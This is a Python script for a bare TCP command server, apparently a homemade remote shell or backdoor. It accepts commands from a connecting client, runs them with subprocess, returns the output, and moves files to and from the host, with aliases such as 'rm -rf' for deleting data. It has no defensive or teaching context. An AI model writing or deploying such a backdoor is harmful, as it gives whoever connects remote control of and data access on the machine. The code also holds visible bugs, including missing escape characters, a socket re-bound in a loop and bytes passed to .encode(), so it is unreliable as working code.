import socket
import subprocess
import sys
import os
import time

black   = "u001b[30m"
red     = "u001b[31m"
green   = "u001b[32m"
yellow  = "u001b[33m"
blue    = "u001b[34m"
white   = "u001b[37m"

class Server:
    def __init__(self,ip:str,port:int):
        self.colors={
            'black'      : "u001b[30m",
            'red'        : "u001b[31m",
            'green'      : "u001b[32m",
            'yellow'     : "u001b[33m",
            'blue'       : "u001b[34m",
            'white'      : "u001b[37m"
        }
        self.linux_commands={
            "goto"       : 'cd',
            "download"   : 'download',
            "upload"     : 'upload',
            "show"       : 'ls',
            "whereami"   : 'pwd',
            "whoami"     : 'whoami',
            "removefile" : 'rm',
            "removedir"  : 'rm -rf',
            "copy_file"  : 'cp',
            "copy_dir"   : 'cp -rf',
        }
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ip   = ip
        self.port = port 
        self.con  = None
        self.addr = None
        while True:
            self.run()


    def run(self):
        self.sock.bind((self.ip,self.port))
        self.sock.listen(1)
        self.con, self.addr = self.sock.accept()
        try:
            with self.con:    
                while True:
                    try:
                        request = self.get_request()
                        if request:
                            response = self.get_response(request)
                            self.send_response(response)
                    except:
                        self.send_response("Some thing wrrong!")
            self.sock.close()
        except Exception:
            pass

    def get_response(self,command:str)->str:
        cmd = command.replace('\n','').\
                      replace('\r','').\
                      replace('\t','').\
                      replace('\b','').\
                      replace('\a','')
        cmd = cmd.split(' ')
        if cmd[0] == 'cd':
            self.change_dir(cmd[1])
            return "Directory Changed Successfully!"
        if cmd[0].lower().startswith('download'):
            self.download_file(cmd[1])
            return b""
        if cmd[0].lower() == 'upload':
            self.upload_file(cmd[1])
            return b""
        res = subprocess.check_output(cmd,
                                    stderr=subprocess.STDOUT,
                                    shell=False)
        return str(res)

    def upload_file(self,file_name=None,path="./"):
        if file_name!=None and path!=None:
            if os.path.isdir(path):
                with open(file_name,"wb+") as file:
                    data = self.con.recv(1024)
                    while data:
                        file.write(data)
                        data = self.con.recv(1024)
                    file.close()
        return f"File {file_name} was Downloaded Successfuly!"

    def download_file(self,file_name):
        file = open(file_name, 'rb')
        data = ' '
        while data: 
            data = file.read(1024)
            self.con.sendall(data)
        return ""
    def exec_app(self,prog):
        return ""

    def send_response(self,resp:str):
        self.con.send(resp.encode())

    def get_request(self)->str:
        try:
            return self.con.recv(1024).decode('utf-8')
        except:
            return "Some thing wrrong !"

    def change_dir(self,directory:str):
        try:
            os.chdir(directory)
        except:
            pass
try:
    s = Server('127.0.0.1',8080)
except:
    pass